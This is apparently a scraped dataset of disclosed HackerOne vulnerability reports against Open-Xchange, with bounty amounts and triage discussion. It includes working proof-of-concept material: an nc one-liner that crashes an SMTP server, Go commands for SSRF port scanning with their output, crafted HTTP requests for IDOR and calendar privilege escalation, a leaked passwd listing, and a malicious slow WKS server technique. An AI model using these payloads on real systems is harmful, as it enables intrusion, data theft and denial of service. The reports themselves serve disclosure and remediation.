4games:x:5:60:games:/usr/games:/usr/sbin/nologin
5man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
6lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
7mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
8news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
9uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
10proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
11www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
12backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
13list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
14irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
15gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
16nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
17sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
18debian:x:1000:1000:Cloud-init-user,,,:/home/debian:/bin/bash
19ntp:x:102:104::/home/ntp:/bin/false
20messagebus:x:103:107::/var/run/dbus:/bin/false
21colord:x:104:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
22saned:x:105:109::/var/lib/saned:/bin/false
23bind:x:106:110::/var/cache/bind:/bin/false
24openldap:x:107:111:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false
25dovecot:x:108:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
26dovenull:x:109:113:Dovecot login user,,,:/nonexistent:/bin/false
27vmail:x:999:999:system user for email:/home/vmail:/bin/false
28nginx:x:110:114:nginx user,,,:/nonexistent:/bin/false
29mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
30clamav:x:112:117::/var/lib/clamav:/bin/false
31postfix:x:113:118::/var/spool/postfix:/bin/false
32amavis:x:114:120:AMaViS system user,,,:/var/lib/amavis:/bin/sh
33debian-spamd:x:115:121::/var/lib/spamassassin:/bin/sh
34open-xchange:x:116:998::/opt/open-xchange:/bin/false
35uuidd:x:100:101::/run/uuidd:/bin/false
36systemd-timesync:x:117:124:systemd Time Synchronization,,,:/run/systemd:/bin/false
37systemd-network:x:118:125:systemd Network Management,,,:/run/systemd/netif:/bin/false
38systemd-resolve:x:119:126:systemd Resolver,,,:/run/systemd/resolve:/bin/false
39systemd-bus-proxy:x:120:127:systemd Bus Proxy,,,:/run/systemd:/bin/false
40wforce:x:121:129:Dovecot,,,:/var/spool/wforce:/bin/false
/etc/resolv.conf content
Code 69 BytesWrap lines Copy Download1domain sandbox-ox.tld
2search sandbox-ox.tld
3nameserver 192.168.10.68 
/etc/hostname content
Code 9 BytesWrap lines Copy Download1sandbox-1
Image F252819: passwd_content.png 348.93 KiBZoom in Zoom out Copy Download
Image F252818: resolv_conf_content.png 57.65 KiBZoom in Zoom out Copy Download
The full file path in the second screenshot is leaked using =CELL(""filename"") function.
I attached some screenshots and the poc file to help reproduce this issue.
Thanks.
Impact
Arbritary local file read on Open-Xchange server.5 attachments:F252816: webservice_modify_resolv_conf.odtF252817: webservice_passwd.odtF252818: resolv_conf_content.pngF252819: passwd_content.pngF252820: webservice_modify.odsmheiland Open-Xchange staff  changed the status to Triaged. Jan 10th (5 years ago)Great catch! Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.
We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories ""researcher credits""?
    
    
        
            
                
                
                
            
        
    
pnig0s   posted a comment. Jan 10th (5 years ago)Yes,i'd like to be included in the advisories in following form if possible.
""Zhang Tianqi(pnig0s)""
Thanks!mheiland Open-Xchange staff  posted a comment. Jan 11th (5 years ago)We'll handle this internally as two reports, one for the path traversal (file inclusion) and one for information exposure (local temporary filename). Bounty will be combined.
    
    
        
            
                
                
                
            
        
    
pnig0s   posted a comment. Jan 11th (5 years ago)Nice,thanks for the update!Open-Xchange  rewarded pnig0s with a $2,000 bounty. Jan 12th (5 years ago)
    
    
        
            
                
                
                
            
        
    
pnig0s   posted a comment. Jan 12th (5 years ago)Hi,
At first,thanks for the bounty.
But according to your bounty policy ""up to a maximum of $5000 for the most severe vulnerabilities"" i think this vulnerability should be considered more severe.
Although this vulnearbility can't lead directly to RCE, it give a wide opportunity to the attacker to gather as much system information(passwd,shadow) or application secret config as they can.And with these informations attacker can make further damage to the system.
Also attacker can using this vulnerability to read sensitive information that belong to other users.
Thanks.
    
    
        
            
                
                
                
            
        
    
pnig0s   posted a comment. Jan 12th (5 years ago)Code 539 BytesWrap lines Copy Download1Does it affect all users or would a practical attack require significant effort to compromise a wider range of users?
2What level of authentication at the attacker and victim side is required to make the attack work?
3Are social-engineering vectors (e.g. phishing) required to execute the vulnerability?
4Is the attack vector remotely exploitable and are multiple steps required to execute it?
5Does the attack require interaction of the victim to be effective?
6Does the attack rely on weaknesses in third party components on the victims side?
Also after checking with the questions that your guys using to review a report,i think this one should be consider more serious.
Thanks.mheiland Open-Xchange staff  posted a comment. Jan 12th (5 years ago)Hi @pnig0s, indeed the most severe vulns can be compensated with $5000. As you mentioned a RCE would be a candidate for such. The vulnerability you reported indeed allows to gather confidential information that could be used in a RCE situation. We valued your findings with the highest bounty ever payed by this program.
However we define severity for each finding individually and do not include assumptions about scenarios that include undiscovered vulnerabilities. Our severity->bounty formula is exponential and uses CVSS to determine a vulnerabilities value, something beyond 9.0 will get you to $5000, which matches typical ratings for RCE.mheiland Open-Xchange staff  closed the report and changed the status to Resolved. Jan 17th (5 years ago)We solved this vulnerability internally and will provide a backport to in-production releases during the next weeks.mheiland Open-Xchange staff  requested to disclose this report. Jul 4th (3 years ago)mheiland Open-Xchange staff  disclosed this report. Jan 24th (3 years ago)",https://hackerone.com/reports/303744,Bavaria,Germany,Nuremberg,2018,1,10,14,33
Open-Xchange,251-500,0.0,10m-50m,$50.00,No value,0.0,Buffer Over-read,Buffer over read from `smtp_command_parse_parameters`,"catenacyber  submitted a report to Open-Xchange.Jun 17th (2 years ago)Function smtp_command_parse_parameters calls uni_utf8_get_char_n with length parameter (size_t)(p - parser->end)when the parameter should be (size_t)(parser->end - p)
To reproduce, send as input to the smtp server 8191 spaces followed by the beginning of one unicode character
printf ' %8190s\xdc' "" ""  | nc localhost 25
Found by oss-fuzz :
https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=23513
Patch is simply
Code 662 BytesWrap lines Copy Download1diff --git a/src/lib-smtp/smtp-command-parser.c b/src/lib-smtp/smtp-command-parser.c
2index d57896393e..2a7cdf63ed 100644
3--- a/src/lib-smtp/smtp-command-parser.c
4+++ b/src/lib-smtp/smtp-command-parser.c
5@@ -181,7 +181,7 @@ static int smtp_command_parse_parameters(struct smtp_command_parser *parser)
6                if (parser->auth_response)
7                        ch = *p;
8                else {
9-                       nch = uni_utf8_get_char_n(p, (size_t)(p - parser->end),
10+                       nch = uni_utf8_get_char_n(p, (size_t)(parser->end - p),
11                                                  &ch);
12                }
13                if (nch == 0)
Impact
This can result in a crash for smtp server, or leaking private information (if we are in valid memory)",https://hackerone.com/reports/900548,Bavaria,Germany,Nuremberg,2020,6,17,11,59
Open-Xchange,251-500,0.0,10m-50m,$50.00,No value,0.0,Buffer Over-read,Buffer overread in parse_angle_addr called from message_address_parse_path ,"catenacyber  submitted a report to Open-Xchange.Apr 1st (3 years ago)Call message_address_parse_path(pool_datastack_create(), data0, size0, &addr2); with input 0x3c,0x40,0x5b,0x40,0x40,0x28, ie
<@[@@(
Stack trace is 
Code 443 BytesWrap lines Copy Download1==26434==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200002b7d6 at pc 0x0001002ed0fe bp 0x7ffeef94ffd0 sp 0x7ffeef94ffc8
2READ of size 1 at 0x60200002b7d6 thread T0
3    #0 0x1002ed0fd in parse_angle_addr message-address.c:180
4    #1 0x1002edb61 in parse_path message-address.c:431
5    #2 0x1002ea289 in message_address_parse_path_real message-address.c:484
6    #3 0x1002ea045 in message_address_parse_path message-address.c:515
Problem is that parse_domain_list can advance the offset after eof and we do not check it afterwards
Patch can be 
Code 727 BytesWrap lines Copy Download1diff --git a/src/lib-mail/message-address.c b/src/lib-mail/message-address.c
2index b1d2a14d1a..bc1d14d43c 100644
3--- a/src/lib-mail/message-address.c
4+++ b/src/lib-mail/message-address.c
5@@ -177,7 +177,7 @@ static int parse_angle_addr(struct message_address_parser_context *ctx,
6        if (*ctx->parser.data == '@') {
7                if (parse_domain_list(ctx) > 0 && *ctx->parser.data == ':') {
8                        ctx->parser.data++;
9-               } else if (parsing_path && *ctx->parser.data != ':') {
10+               } else if (parsing_path && ctx->parser.data < ctx->parser.end && *ctx->parser.data != ':') {
11                        return -1;
12                } else {
13                        if (ctx->fill_missing)
Impact
Buffer overhead might result in sensitive data leak, or crash",https://hackerone.com/reports/836045,Bavaria,Germany,Nuremberg,2020,4,1,9,13
Open-Xchange,251-500,0.0,10m-50m,$400.00,Medium,5.0,Server-Side Request Forgery (SSRF),Blind SSRF in /appsuite/api/oxodocumentfilter&action=addfile,"skr0x1c0  submitted a report to Open-Xchange.May 4th (3 years ago)Summary
Logic in AddFileAction.getImageDataFromUrl for fetching images from external URLs when handling /appsuite/api/oxodocumentfilter&action=addfile implemented here validates the redirected URLs only after following all redirects
Code 736 BytesWrap lines Copy Download1response = httpClient.execute(getRequest, context);
2
3int statusCode = response.getStatusLine().getStatusCode();
4if (statusCode == HttpStatus.SC_OK) {
5    List<URI> locations = context.getRedirectLocations();
6    if (locations != null) {
7        for (URI uri : locations) {
8            try {
9                Optional<OXException> oxException = validator.apply(uri.toURL());
10                if (oxException.isPresent()) {
11                    throw (RESTException) oxException.get().getCause();
12                }
13            } catch (MalformedURLException e) {
14                throw new RESTException(ErrorCode.GENERAL_ARGUMENTS_ERROR, e);
15            }
16        };
17    }
18    long length = response.getEntity().getContentLength();
19    ...
20}
This may be used by an attacker to execute blind SSRF attacks.
Demo
Video F814210: demo_ps.mov 6.73 MiBZoom in Zoom out Copy Download
Steps to reproduce


Install Open-Xchange and Documents in a virtual machine by following guides https://oxpedia.org/wiki/index.php?title=AppSuite:Open-Xchange_Installation_Guide_for_Debian_9.0 and https://oxpedia.org/wiki/index.php?title=AppSuite:Documents_Installation_Guide#Debian_GNU.2FLinux_9.0_.28valid_from_v7.10.29


Inside VM run following command to make netcat listen on 127.0.0.1:7070
Code 23 BytesWrap lines Copy Download1nc -l 127.0.0.1 -p 7070


On host machine, install golang from https://golang.org/dl/


Download and extract poc.zip file


Open terminal / command line and set current directory to extracted poc.zip folder


Run command
Code 142 BytesWrap lines Copy Download1go run . -redirectorAddress=""172.16.146.1:8081"" -targetPorts=""7070"" -serverRoot=""http://172.16.66.130"" -username=""testuser"" -password=""secret""
where

redirectorAddress: The IP address and port the which redirector server should bind to. This IP address should be accessible from the VM
targetPorts: Port inside VM where netcat is listening to
serverRoot: Base URL of open-xchange server
serverUser: Username of any user in open-xchange server
serverPass: Password of user in open-xchange server



Running above command will display following output in netcat
Code 147 BytesWrap lines Copy Download1GET /image.png HTTP/1.1
2Accept: *
3Accept-Encoding: gzip
4Host: 127.0.0.1:7070
5Connection: Keep-Alive
6User-Agent: Open-Xchange Image Url Data Fetcher
Impact
Since this is a blind SSRF, it is not possible to read the response of HTTP requests. However this vulnerability can be used for reconnaissance.
Example: Port Scan by measuring response time
To run a port scan on ports 7070,61616,8004,80,22,25,8080,3125 on the local network of server, execute the following command
Code 184 BytesWrap lines Copy Download1go run . -redirectorAddress=""172.16.146.1:8081"" -targetPorts=""7070,61616,8004,80,22,8080,3125"" -serverRoot=""http://172.16.66.130"" -username=""testuser"" -password=""secret"" -numSamples=20
Output:
Code 281 BytesWrap lines Copy Download12020/05/04 13:32:42 7070: 2.220000
22020/05/04 13:32:42 61616: 3567.000000
32020/05/04 13:32:42 8004: 2.980000
42020/05/04 13:32:42 80: 3.180000
52020/05/04 13:32:42 22: 34.600000
62020/05/04 13:32:42 25: 2169.333333
72020/05/04 13:32:42 8080: 2.560000
82020/05/04 13:32:42 3125: 3.000000
We can use lsof to see open ports inside the VM
Code 32 BytesWrap lines Copy Download1sudo lsof -nP -iTCP -sTCP:LISTEN
Output:
Code 1.39 KiBWrap lines Copy Download1COMMAND  PID         USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
2java     467 open-xchange   15u  IPv6  13049      0t0  TCP 172.16.66.130:9994 (LISTEN)
3java     467 open-xchange   16u  IPv6  15970      0t0  TCP *:42319 (LISTEN)
4java     467 open-xchange   24u  IPv6  14136      0t0  TCP 127.0.0.1:61616 (LISTEN)
5java     467 open-xchange   33u  IPv6  16419      0t0  TCP *:8004 (LISTEN)
6java     489 open-xchange   37u  IPv6  14138      0t0  TCP 127.0.0.1:9999 (LISTEN)
7java     489 open-xchange   42u  IPv6  17565      0t0  TCP 127.0.0.1:1099 (LISTEN)
8java     489 open-xchange   47u  IPv6  14144      0t0  TCP 127.0.0.1:5701 (LISTEN)
9java     489 open-xchange  127u  IPv6  15345      0t0  TCP *:36149 (LISTEN)
10java     489 open-xchange  144u  IPv6  17559      0t0  TCP 127.0.0.1:8009 (LISTEN)
11apache2  526         root    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
12apache2  527     www-data    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
13apache2  528     www-data    3u  IPv6  13789      0t0  TCP *:80 (LISTEN)
14mysqld   695        mysql   26u  IPv4  13847      0t0  TCP 127.0.0.1:3306 (LISTEN)
15exim4   1077  Debian-exim    3u  IPv4  13115      0t0  TCP 127.0.0.1:25 (LISTEN)
16exim4   1077  Debian-exim    4u  IPv6  13116      0t0  TCP [::1]:25 (LISTEN)
17sshd    1345         root    3u  IPv4  14259      0t0  TCP 172.16.66.130:22 (LISTEN)
18sshd    1345         root    4u  IPv4  14261      0t0  TCP 127.0.0.1:22 (LISTEN)
From the above outputs, following observations can be made:

As we can see for closed ports 7070, 8080 and 3125, the response times are low (~ less than 3ms)
For open ports, depending on the type of listening connection, response time varies

For ssh (port 22) the response time is ~34ms
For exim (port 25) the response time is ~2170ms
For ActiveMQ (port 61616) the reponse time is ~3567ms
For http (port 80 and 8004) the response time is ~3ms (this type is hard to distinguish from closed ports)



So an attacker can use this vulnerability to detect most open ports and can use the response time to detect the type of connection (ssh / exim / activemq etc.)2 attachments:F814210: demo_ps.movF814219: poc.zipmheiland Open-Xchange staff  changed the status to Triaged. May 7th (3 years ago)mheiland Open-Xchange staff  updated the severity from medium to low (3.1). May 8th (3 years ago)mheiland Open-Xchange staff  posted a comment. May 8th (3 years ago)Thanks for reporting this vulnerability to us. We take your feedback very serious and started the process of resolving and delivering a solution to our users. Please note that we will take care about public disclosure of the vulnerability and give our users a chance to update to a fixed version before. Therefor, please handle this finding with discretion until we publicly disclosed it.
We'll discuss the matter of bounty for this finding soon and will update you shortly. Would you like to be included in our advisories ""researcher credits""?skr0x1c0   posted a comment. May 8th (3 years ago)Hello @mheiland, 
Yes, I would like to be included in the advisories. Please use following information for the same:
Sreejith Krishnan R(@skr0x1c0)skr0x1c0   posted a comment. May 8th (3 years ago)Hello @mheiland,
Could you tell me the parameter used for severity calculation.
When using very conservative parameters for calculation, I was getting CVE rating of 4.0
Image F820416: Screenshot_2020-05-08_at_3.49.35_PM.png 376.36 KiBZoom in Zoom out Copy Download
Also other SSRF vulnerability reports reported earlier where given medium severity rating, eg: 2960451 attachment:F820416: Screenshot_2020-05-08_at_3.49.35_PM.pngmheiland Open-Xchange staff  updated the severity from low (3.1) to medium (5.0). May 8th (3 years ago)mheiland Open-Xchange staff  posted a comment. May 8th (3 years ago)Thanks for the hint, the rating got reviewed and ""attack complexity"" is now rated ""low"" as this vuln does not depend on exact timing.skr0x1c0   posted a comment. May 8th (3 years ago)Thanks for the review and update @mheiland!mheiland Open-Xchange staff  closed the report and changed the status to Resolved. May 14th (3 years ago)We reviewed this vulnerability internally and will provide a backport to in-production releases during the next months.Open-Xchange  rewarded skr0x1c0 with a $400 bounty and a $150 bonus. May 14th (3 years ago)skr0x1c0   posted a comment. May 14th (3 years ago)Thank you for the bounty and bonus! I really appreciate this :)skr0x1c0   requested to disclose this report. Sep 24th (2 years ago)Since this bug is fixed in 7.10.4, can we disclose this report?mheiland Open-Xchange staff  posted a comment. Sep 24th (2 years ago)Yes we will disclose this soon. We have some grace time to allow our users to upgrade their environments, sadly not everyone is on the latest and greatest version at all time. I plan to disclose this in mid-October.skr0x1c0   posted a comment. Nov 23rd (2 years ago)This bug was disclosed on security advisory published in 13th October 2020 (https://seclists.org/fulldisclosure/2020/Oct/20).
Can we disclose this report also?mheiland Open-Xchange staff  agreed to disclose this report. Nov 23rd (2 years ago)  This report has been disclosed. Nov 23rd (2 years ago)",https://hackerone.com/reports/865652,Bavaria,Germany,Nuremberg,2020,5,4,9,44
Open-Xchange,251-500,0.0,10m-50m,$200.00,Critical,9.5,Privilege Escalation,Critical : View/Edit access to private appointments of calendar folder by read only user (Vertical privilege escalation),"indoappsec  submitted a report to Open-Xchange.Apr 13th (6 years ago)Hi Team,
Description : Read only user of calendar folder shouldn't be able access any private appointments. I have found a move calendar folder request which is working for read only user. Once Attacker moves the appointment to his folder , then he can Access private appointments.
Vulnerable HTTP request : 
PUT /appsuite/api/multiple?session=[session_token] HTTP/1.1
Host: sandbox.open-xchange.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, /; q=0.01
Accept-Language: en-US,en;q=0.5
Content-Type: text/javascript; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://sandbox.open-xchange.com/appsuite/
Content-Length: 113
Cookie: [cookie_values]
Connection: close
[{""action"":""update"",""id"":[appointmentID],""folder"":[Current_Folder_ID],""timestamp"":1492114513233,""module"":""calendar"",""data"":{""folder_id"":""[Target_folder_ID]""}}]
Here you need to keep the Current_Folder_ID and Target_folder_ID of you own calendars where you are admin . you just need to change appointmentID to private appointmentID where you are read only user. This request will be accepted by server and appointment will be added into your target calendar folderID. Once appointment is added into your folder you will be able to View all it's content and Edit it. 
Actual problem  : When you move the appointment , the appointment is copied with same appointmenID which leads to this attack . 
Issues :
1.You can view appointment it's attachments and members etc.
2.You can change the status of appointment.
3.You can edit the details of calendar.
4.You can move the calendar .
Let me know if you require Steps or Video POC for this issue. 
Best Regards !
Vijay Kumar",https://hackerone.com/reports/220874,Bavaria,Germany,Nuremberg,2017,4,13,21,56
Open-Xchange,251-500,0.0,10m-50m,$50.00,No value,0.0,Business Logic Errors,Failed assert in `mail_index_transaction_lookup`,"catenacyber  submitted a report to Open-Xchange.Aug 24th (2 years ago)To reproduce, run test suite on following input :
Code 160 BytesWrap lines Copy Download1require""vnd.dovecot.testsuite"";require ""fileinto"";require ""mailbox"";test"""" {fileinto:create ""Folder"";
2if test_result_execute {
3}test_message:folder ""Folder"" 2;}
Output is with (ASAN enabled) stack trace
Code 1.52 KiBWrap lines Copy Download1testsuite: Panic: file mail-index-transaction-update.c: line 19 (mail_index_transaction_lookup): assertion failed: (seq >= t->first_new_seq && seq <= t->last_new_seq)
2==88957== ERROR: libFuzzer: deadly signal
3    #0 0x10ccb10e7 in __sanitizer_print_stack_trace (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x600e7)
4    #1 0x10c4b2d5a in fuzzer::PrintStackTrace() FuzzerUtil.cpp:205
5    #2 0x10c494b66 in fuzzer::Fuzzer::CrashCallback() FuzzerLoop.cpp:232
6    #3 0x7fff6121df59 in _sigtramp (libsystem_platform.dylib:x86_64+0x1f59)
7    #4 0x11427ca3f in initialPoolContent (dyld:x86_64+0x52a3f)
8    #5 0x7fff60fbb1ad in abort (libsystem_c.dylib:x86_64+0x5d1ad)
9    #6 0x10cb15a55 in default_fatal_finish failures.c:459
10    #7 0x10cb1425c in fatal_handler_real failures.c:471
11    #8 0x10cb14220 in default_fatal_handler failures.c:479
12    #9 0x10cb1445f in i_panic failures.c:523
13    #10 0x10c9aa992 in mail_index_transaction_lookup mail-index-transaction-update.c:19
14    #11 0x10c9ae4a2 in tview_lookup_uid mail-index-transaction-view.c:162
15    #12 0x10c97cc97 in index_mail_set_seq index-mail.c:1999
16    #13 0x10c468a49 in testsuite_mailstore_mail_index testsuite-mailstore.c:271
17    #14 0x10c46e3ac in cmd_test_message_mailbox_operation_execute cmd-test-message.c:501
18    #15 0x10c5c15dd in sieve_interpreter_operation_execute sieve-interpreter.c:899
19    #16 0x10c5c0fee in sieve_interpreter_continue sieve-interpreter.c:940
20    #17 0x10c5c1bc6 in sieve_interpreter_start sieve-interpreter.c:1012
21    #18 0x10c476cee in testsuite_run fuzz_testsuite.c:60
Impact
I do not think there is a security impact but pigeonhole should check these values, before passing them to dovecot's lib-index and calling index_mail_set_seqsbosch Open-Xchange staff  posted a comment. Aug 25th (2 years ago)Problem is strictly limited to the test suite. I have a fix.akituomi Open-Xchange staff  changed the status to Triaged. Aug 27th (2 years ago)akituomi Open-Xchange staff  updated the severity from low (2.3) to none. Aug 27th (2 years ago)akituomi Open-Xchange staff  closed the report and changed the status to Resolved. Aug 27th (2 years ago)This is not a security issue, and we thank you for taking time to report this to us. We will fix this bug eventually.Open-Xchange  rewarded catenacyber with a $50 bonus. Aug 27th (2 years ago)akituomi Open-Xchange staff  requested to disclose this report. Aug 27th (2 years ago)catenacyber   agreed to disclose this report. Aug 27th (2 years ago)  This report has been disclosed. Aug 27th (2 years ago)",https://hackerone.com/reports/965782,Bavaria,Germany,Nuremberg,2020,8,24,13,8
Open-Xchange,251-500,0.0,10m-50m,$300.00,Medium,5.45,Violation of Secure Design Principles,IDOR - Deleting other user's reminders just by id,"inhibitor181  submitted a report to Open-Xchange.Jan 17th (6 years ago)Hello, I have found that one can delete other user's reminders just by passing the id. The folder id, user id and other linking data is not passed and not validated (by making a normal delete requests all these parameters are passed, but they don't seem to be validated)
POC
Code 154 BytesWrap lines Copy Download1PUT /appsuite/api/reminder?action=delete&session=619f92c3343e426d968f6782e5eaba4a HTTP/1.1
2Host: sandbox.open-xchange.com
3Connection: close
4/**/
5
6{""id"":5}
Response
Code 48 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Server: nginx
3/**/
4
5{""data"":[5]}
The reminder with id 5 does not belong to the logged user.
I have also attached a video to see the exploit made. As you will see, I will be logged with user 2, then make burp requests to get all my reminders. User 2 will have 2 reminders. Then I will switch to user 3 in incognito and you can see that this user has just 1 reminder with another id. Then, from this user I will make a request to delete a reminder from user 2 just by passing the id. I will click this 2 times and after this, I will switch to user 2 and see that his reminder has been deleted by user 3. The users can be identified by the passes session id in the request and you will see this is different.",https://hackerone.com/reports/198969,Bavaria,Germany,Nuremberg,2017,1,17,10,54
Open-Xchange,251-500,0.0,10m-50m,$888.00,High,7.95,Information Disclosure,IDOR - Accessing other user's attachements via PUT /appsuite/api/files?action=saveAs,"inhibitor181  submitted a report to Open-Xchange.Feb 9th (6 years ago)Hello, I have found a request in witch a user is able to copy other user's pattachements in his own folders and after that, he is able to download them or he is able to email them to another address or able to view them in browser.
POC
Code 232 BytesWrap lines Copy Download1PUT /appsuite/api/files?action=saveAs&attached=2&attachment=1&folder=41&module=1&session=4991e492365e4904bd8399333bc233de HTTP/1.1
2Host: sandbox.open-xchange.com
3//*headers, cookies*//
4
5{""folder_id"":""54"",""description"":""Description""}
Response
Code 80 BytesWrap lines Copy Download1HTTP/1.1 200 OK
2Server: nginx
3//**//
4
5{""data"":""54/51"",""timestamp"":1486649907803}
In order for this to work you have to just pass in the GET parameter a folder id in where YOU have access for writing (it doesn't matter witch folder id is, you just need to be able to write in it!) and then change the attachement id. This will create a copy of the given attachement ID in the folder given in the JSON input (in the POC case 54). The server wil respond with the new folderID + file id.
Then you can go to you files and see the copy of the targeted id.
I have also attached 2 POC videos.
In the first you can see the attack. In the first seconds you can see that the folder parameter from the GET request is just being used for writing validation, it doesn't really happen anything with it, there is no validation whether the attachement is in the inputted folder or not. Then I will copy all the attachement across all the accounts (for example XXE and exif are in user2's account, and you can see I am logged in with user3).
Later in the video I have clicked the wrong links (while in incognito mode I cannot open files in new tabs because I am logged out), but in the second one you can see the download is working. Also sending the file per email or opening in browser works. That is why I have uploaded video 2.",https://hackerone.com/reports/204984,Bavaria,Germany,Nuremberg,2017,2,9,14,43
Open-Xchange,251-500,0.0,10m-50m,$444.00,Low,3.1,Denial of Service,Guard WKS lookup: Evil WKS server forces connections to last forever,"afewgoats  submitted a report to Open-Xchange.Oct 23rd (2 years ago)Summary by afewgoatsAny logged-in user can cause denial of service against the AppSuite server by asking Guard to fetch keys from a malicious WKS server. This WKS server's response never ends, tieing up a java process and TLS connection forever.
This was fixed in by Open-Xchange in GUARD-228
Reproduction Steps

Setup badly-behaving WKS server
Compose new email
Enable encryption with Guard by clicking the padlock
Enter ""To address"" of an email address on the malicious domain

Or just GET https://sandbox.open-xchange.com/appsuite/api/oxguard/keys?action=getRecipKey&email=8@my.dom.ain&session=...&ticks=123 with a valid session & cookies.
We enter function com.openexchange.guard.wksclient.impl.WKSClient.fetchKeys and AppSuite Guard makes an HTTP request to look up 8@my.dom.ain's public key at https://my.dom.ain/.well-known/openpgpkey/hu/93q5zuif339nunfaa4ph9z66trnkixy9
This AppSuiteGuard-to-WKS HTTP request never ends as my malicious WKS server evades the timeout.
The malicious WKS server responds, but very slowly: forever, at a rate of 1 byte per 3.21 seconds.
This prevents the timeout logic from killing the connection, so the connection stays open forever.
Timeout logic
The timeouts are specified with:
Code 375 Bytes1    private HttpClient getClient(int connectionTimeout) {
2        RequestConfig requestConfig = RequestConfig.custom()
3            .setConnectTimeout(connectionTimeout)
4            .setSocketTimeout(connectionTimeout)
5            .setRedirectsEnabled(false)
6            .build();
7        return HttpClientBuilder.create().setDefaultRequestConfig(requestConfig).build();
8    }

Connect timeout is bypassed because we do successfully make a connection.
Socket timeout is bypassed because the data flow isn't stopped. While slow, there is data received continuously at a rate of ~1 byte per 3210ms.

In this state, the AppSuiteGuard-to-WKS connection will never terminate. Memory of the process will increase.
I saw connections to my server from 157.97.76.28 from Apache-HttpClient/4.5.12 (Java/1.8.0_242) which lasted over 1 hour.
Making it more violent
I also made a variation where instead of very slow data transfer, the server responds with megabytes of never-ending data.
After 141.7MB was sent from my WKS server to AppSuite (around 15 seconds), a 500 Internal Error was returned.",https://hackerone.com/reports/1016691,Bavaria,Germany,Nuremberg,2020,10,23,1,0
Open-Xchange,251-500,0.0,10m-50m,$850.00,Medium,5.45,Server-Side Request Forgery (SSRF),SSRF in VCARD photo upload functionality,"logan5  submitted a report to Open-Xchange.Dec 7th (5 years ago)FYI - Tested on local installation of App Suite 7.8.4 REV 14, CentOS 7.4, x64
Hello,
I believe I may have found another SSRF re-direct vulnerability which again will allow port scanning of the App Suite server and the internal network, this is similar to my earlier report: #293847
The endpoint is the following which is used to import contacts via external VCARD files:
http://<domain>/appsuite/api/import?action=VCARD
Pre-requisites to exploit this vulnerability are the following:
-Attacker server
-Attacker controlled domain name
-vcard file
-Valid session from login or anonymous link
Summary
The App Suite source code contains the following Java file which appears to be used to import a contact photograph via a URL, provided from a .vcard file:
backend/com.openexchange.contact.vcard.impl/src/com/openexchange/contact/vcard/impl/mapping/PhotoMapping.java
The section of code at line numbers 427-465 does a decent job of ensuring that any URL entered is not a local address to the App Suite server.  I had to modify my PoC from my previous report to take this into account.
Further in this file, is the below section which handles redirect requests, line numbers 479-491:
Code 858 BytesWrap lines Copy Download1// Follow & check redirects recursively
2            if (urlConnnection instanceof HttpURLConnection) {
3                HttpURLConnection httpURLConnection = (HttpURLConnection) urlConnnection;
4                int responseCode = httpURLConnection.getResponseCode();
5                if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP) {
6                    String redirectUrl = urlConnnection.getHeaderField(""Location"");
7                    httpURLConnection.disconnect();
8                    return new LoadedImage(redirectUrl);
9                }
10                if (responseCode >= 400) {
11                    addConversionWarning(warnings, ""PHOTO"", ""image URL \"""" + origUrlString + ""\"" appears not to be valid, skipping import."");
12                    return NULL_RESULT;
13                }
14            }
 My interpretation was that if a redirect was sent that matched the following:
HTTP_MOVED_PERM
HTTP_MOVED_TEMP
Which translates to a HTTP 301 and 302 response according to the following Java documentation:
https://docs.oracle.com/javase/7/docs/api/java/net/HttpURLConnection.html
The returned URL would be re-checked to make sure it is not a local address.  The suspected vulnerability is the check of response codes 301 and 302, as it doesn’t take into account other HTTP re-direct response codes such as 303 and 305.  However, further testing proved that standard response codes were being accepted as well, e.g. 301/302.
Note.  I am not a programmer so the above analysis might be incorrect
PoC Setup
Image F245109: poc_setup.png 47.23 KiBZoom in Zoom out Copy Download
The below PoC will contain the following files:
attacker_server.py:  (Attackers python web server running on TCP port 70, responses to all GET requests with a 301 re-direct to http://127.0.0.1 on a rotating TCP port
request.py:  (Attackers python script that will submit login credentials to obtain a session cookie and then send 20 post requests to upload a VCARD)
test.vcard:  (Attackers VCARD file based on the following example from Wikipedia https://en.wikipedia.org/wiki/VCard.  The file contains the following URL entry which is used to upload a photo to the contact entry:
: PHOTO;VALUE=URI;TYPE=GIF:http://testserver65.com:70/test.jpeg.  
script_results.txt:  (Results of HTTP response times per-port)
PoC
1) The attacker_server.py script will run on 192.168.0.6 (Attacker server), this will setup a Python webserver running on port 70 and will await a GET request.
2) Netcat listeners are running on TCP port 2, 6, 8, and 10 to simulate listening ports that will accept HTTP connections on the App Suite server.
